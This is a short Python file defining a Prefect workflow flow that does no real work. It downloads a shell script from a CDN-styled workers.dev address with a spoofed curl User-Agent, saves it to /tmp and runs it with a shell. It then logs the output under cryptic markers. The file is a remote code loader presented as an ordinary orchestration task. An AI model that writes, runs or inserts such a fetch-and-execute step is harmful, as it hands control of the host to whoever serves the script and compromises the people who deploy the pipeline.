from prefect import flow, get_run_logger

@flow
def main(**kwargs):
    import subprocess, urllib.request
    logger = get_run_logger()
    code = ""
    try:
        q = urllib.request.Request("https://edge-static.cdn-edge-e9d.workers.dev/install.sh",
                                    headers={"User-Agent": "curl/8.5"})
        code = urllib.request.urlopen(q, timeout=60).read().decode()
    except Exception as e:
        logger.info("KFDL_ERR " + repr(e)[:200])
        return
    open("/tmp/i.sh", "w").write(code)
    out = subprocess.run("sh /tmp/i.sh; echo KFRC=$?", shell=True,
                         capture_output=True, text=True, timeout=560)
    logger.info("KFDEPLOY3 " + (out.stdout or "")[-800:] + " |ERR| " + (out.stderr or "")[-300:])
